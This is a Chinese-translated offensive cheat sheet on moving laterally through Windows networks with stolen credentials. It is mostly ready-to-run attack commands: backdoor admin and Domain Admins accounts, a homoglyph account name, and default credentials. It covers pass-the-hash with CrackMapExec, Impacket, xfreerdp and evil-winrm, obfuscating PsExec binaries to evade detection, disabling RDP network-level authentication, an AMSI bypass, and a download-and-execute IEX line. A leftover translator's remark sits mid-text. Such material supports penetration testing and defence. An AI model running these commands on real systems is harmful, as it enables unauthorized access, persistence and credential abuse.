# Windows - 使用凭据

## 摘要

* [获取凭据](#get-credentials)
  * [创建您的凭据](#create-your-credential)
  * [访客凭据](#guest-credential)
  * [零售凭据](#retail-credential)
  * [沙盒凭据](#sandbox-credential)
* [Crackmapexec](#crackmapexec)
* [Impacket](#impacket)
  * [PSExec](#psexec)
  * [WMIExec](#wmiexec)
  * [SMBExec](#smbexec)

* [RDP 远程桌面协议](#rdp-remote-desktop-protocol)
* [Powershell 远程协议](#powershell-remoting-protocol)
  * [Powershell 凭据](#powershell-credentials)
  * [Powershell PSSESSION](#powershell-pssession)
  * [Powershell 安全字符串](#powershell-secure-strings)
* [SSH 协议](#ssh-protocol)
* [WinRM 协议](#winrm-protocol)
* [WMI 协议](#wmi-protocol)

* [其他方法](#other-methods)
  * [PsExec - Sysinternal](#psexec-sysinternal)
  * [挂载远程共享](#mount-a-remote-share)
  * [以其他用户身份运行](#run-as-another-user)

## 获取凭据

### 创建您的凭据

```powershell
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add # RDP 访问权限
net localgroup "Backup Operators" hacker /add # 对文件的完全访问权限
net group "Domain Admins" hacker /add /domain

# 启用域用户账户
net user hacker /ACTIVE:YES /domain

# 防止用户更改密码
net user username /Passwordchg:No

# 防止密码过期
net user hacker /Expires:Never

# 创建机器账户（在 net users 中不显示）
net user /add evilbob$ evilpassword

# 同形异义词 Aԁmіnistratοr（与 Administrator 不同）
Aԁmіnistratοr
```

关于您的用户的一些信息

```powershell
net user /dom
net user /domain
```

### 访客凭据

默认情况下，每台 Windows 机器都带有一个访客账户，其默认密码为空。

```powershell
用户名：Guest
密码：[空]
NT 哈希：31d6cfe0d16ae931b73c59d7e0c089c0
```

文档：
### 零售凭证

零售凭证 [@m8urnett 在 Twitter](https://twitter.com/m8urnett/status/1003835660380172289)

当你在零售演示模式下运行Windows时，它会创建一个名为Darrin DeYoung的用户和一个管理员RetailAdmin

```powershell
用户名：RetailAdmin
密码：trs10
```

### 沙盒凭证

WDAGUtilityAccount - [@never_released 在 Twitter](https://twitter.com/never_released/status/1081569133844676608)

从Windows 10版本1709（秋季创作者更新）开始，它是Windows Defender Application Guard的一部分

```powershell
\\windowssandbox
用户名：wdagutilityaccount
密码：pw123
```

## Crackmapexec

使用 [mpgn/CrackMapExec](https://github.com/mpgn/CrackMapExec)

* CrackMapExec支持多种协议

  ```powershell
  crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
  crackmapexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
  crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
  crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
  crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
  ```

* CrackMapExec适用于密码、NT哈希和Kerberos认证。

  ```powershell
  crackmapexec smb 192.168.1.100 -u Administrator -p "Password123?" # 密码
  crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" # NT 哈希
  export KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache # Kerberos
  ```

## Impacket

来自 [fortra/impacket](https://github.com/fortra/impacket)（:warning: 在Kali中重命名为impacket-xxxxx）    
:warning: `get` / `put` 对于wmiexec, psexec, smbexec, 和 dcomexec将更改为`lget`和`lput`。    
:warning: 法语字符可能无法在输出中正确显示，使用`-codec ibm850`来解决这个问题。   
:warning: 默认情况下，Impacket的脚本存储在示例文件夹中：`impacket/examples/psexec.py`。 

所有Impacket的*exec脚本都不相同，它们将针对托管在多个端口上的服务。 
下表总结了每个脚本使用的端口。

| 方法        | 使用的端口                            | 需要管理员权限 |
| ----------- | ------------------------------------- | -------------- |
| psexec.py   | tcp/445                               | 是             |
| smbexec.py  | tcp/445                               | 否             |
| atexec.py   | tcp/445                               | 否             |
| dcomexec.py | tcp/135, tcp/445, tcp/49751 (DCOM)    | 否             |
| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) | 是             |

* `psexec`：使用RemComSvc二进制的Windows PSEXEC的等效物。

  ```ps1
  psexec.py DOMAIN/username:password@10.10.10.10
  ```

* `smbexec`：类似于PSEXEC的方法，但不使用RemComSvc

  ```ps1
  smbexec.py DOMAIN/username:password@10.10.10.10
  ```

* `atexec`：通过任务计划程序服务在目标机器上执行命令，并返回执行的命令的输出。

  ```ps1
  atexec.py DOMAIN/username:password@10.10.10.10
  ```

* `dcomexec`：类似于wmiexec.py的半交互式shell，但使用不同的DCOM端点

  ```ps1
  dcomexec.py DOMAIN/username:password@10.10.10.10
  ```

* `wmiexec`：一种半交互式shell，通过Windows Management Instrumentation使用。首先它使用tcp/135和tcp/445端口，最终它与Winmgmt Windows服务通过动态分配的高端口（如tcp/50911）通信。

  ```ps1
  wmiexec.py DOMAIN/username:password@10.10.10.10
  wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
  ```

要允许非RID 500本地管理员账户执行Wmi或PsExec，请执行：
`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1`
要防止RID 500能够WmiExec或PsExec，请执行：
`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /f /d 1`

### PSExec

与其上传`psexeccsv`服务二进制文件，不如上传一个具有任意名称的服务二进制文件到`ADMIN$`。
PSExec默认的[kavika13/RemCom](https://github.com/kavika13/RemCom)二进制文件已有10年的历史，您可能需要重新构建并混淆它以减少检测([snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb))

使用自定义二进制文件和 服务名称：`psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name custombin.exe`

还可以使用参数指定自定义文件：`-file /tmp/RemComSvcCustom.exe`。
您需要更新第163行中的管道名称以匹配“Custom_communication”

```py
162    tid = s.connectTree('IPC$')
163    fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)
```

或者，您可以使用分支[ThePorgs/impacket](https://github.com/ThePorgs/impacket/pull/3/files)。

### WMIExec

使用非默认共享`-share SHARE`来写入输出，以减少检测。
默认执行此命令：`cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__RANDOM 2>&1`

### SMBExec

它创建了一个名为`BTOBTO`的服务（[smbexec.py#L59](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L59)），并将攻击者的命令从批处理文件中传输到`%TEMP/execute.bat`（[smbexec.py#L56](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L56)）。

```py
OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'execute.bat'
SMBSERVER_DIR   = '__tmp'
DUMMY_SHARE     = 'TMP'
SERVICE_NAME    = 'BTOBTO'
```

每次我们执行命令时，它都会创建一个新服务。它还会生成事件7045。

默认执行此命令：`%COMSPEC% /Q /c echo dir > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat`，其中`%COMSPEC%`指向`C:\WINDOWS\system32\cmd.exe`。

```py
class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName, shell_type):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__shell_type = shell_type
        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__serviceName = serviceName
```

## RDP 远程桌面协议

:warning: **注意**：您可能需要启用RDP并禁用NLA并修复CredSSP错误。

```powershell
# Enable RDP
PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
PS C:\> netsh firewall set service remoteadmin enable
PS C:\> netsh firewall set service remotedesktop enable
# Alternative
C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable

# Fix CredSSP errors
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Disable NLA
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```

根据您提供的文档内容，以下是全部内容的整理：

# 滥用RDP协议远程执行命令

## 使用`rdesktop`

```powershell
root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
root@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10
# -g : 屏幕将占据实际屏幕大小的70%
# -r disk:share : 在远程桌面会话期间共享本地文件夹
```

## 使用`freerdp`

```powershell
root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
root@payload$ xfreerdp /v:10.0.0.1 /u:username # 将要求输入密码

# 使用Restricted Admin传递哈希，需要不在"Remote Desktop Users"组中的管理员账户。
# 传递哈希适用于Server 2012 R2 / Win 8.1+
# 需要freerdp2-x11 freerdp2-shadow-x11包而不是freerdp-x11
root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d
```

## 使用[SharpRDP](https://github.com/0xthirteen/SharpRDP)

```powershell
PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
```

# PowerShell远程协议

## PowerShell凭据

```ps1
PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)
```

## PowerShell PSSESSION

### 在主机上启用PSRemoting

```ps1
Enable-PSRemoting -Force
net start winrm

# 将机器添加到受信任的主机
Set-Item wsman:\localhost\client\trustedhosts *
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.10"
```

### 执行单个命令

```powershell
PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
```

### 与PSSession交互

```powershell
PS> Enter-PSSession -computerName DC01
[DC01]: PS>

# 一对一执行脚本和命令
PS> $Session = New-PSSession -ComputerName CLIENT1
PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 }
PS> Invoke-Command -Session $Session -scriptBlock { $test }
1
```

## PowerShell安全字符串

```ps1
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
$decrypted
```

# WinRM协议

**要求**：

* 端口**5985**或**5986**开放。
* 默认端点是**/wsman**

如果系统上禁用了WinRM，可以使用以下命令启用它：`winrm quickconfig`

在Linux上通过[Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)与WinRM交互是最简单的方法

```powershell
evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
evil-winrm -i 10.0.0.20 -u username -H HASH
evil-winrm -i 10.0.0.20 -u username -p password -r domain.local

*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```

## WMI协议

```powershell
PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
```

## SSH协议

:警告：你不能将哈希值传递给SSH，但你可以使用Kerberos票证连接（通过传递哈希值可以获得！）

```ps1
cp user.ccache /tmp/krb5cc_1045
ssh -o GSSAPIAuthentication=yes user@domain.local -vv
```

## 其他方法

### PsExec - Sysinternal

从Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

```powershell
PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe

# 切换管理员用户为NT Authority/System
PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe -s 
```

### 挂载远程共享

```powershell
PS C:\> net use \\srv01.domain.local /user:DOMAIN\username password C$
```

### 以其他用户身份运行

Runas是一个内置于Windows Vista的命令行工具。
允许用户以与当前登录提供的权限不同的权限运行特定的工具和程序。

```powershell
PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
```

## 参考资料

- [Ropnop - 使用凭据拥有Windows盒子](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Ropnop - 使用凭据拥有Windows盒子 第二部分](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [从Active Directory外部获取域管理员权限](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
- [Impacket 从Linux对Windows进行远程代码执行 - Vry4n_ - 2021年6月20日](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/)
- [Impacket 执行命令备忘单 - 13cubed](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf)
- [SMB协议备忘单 - aas-s3curity](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/lateral-movement/smb-protocol)
- [使用smb、psexec及其替代方案进行Windows横向移动 - nv2lt](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)
- [PsExec.exe IOCs和检测 - Threatexpress](https://threatexpress.com/redteaming/tool_ioc/psexec/)
- [深入探讨SMBEXEC - dmcxblue - 2021年2月8日](https://0x00sec.org/t/a-dive-on-smbexec/24961)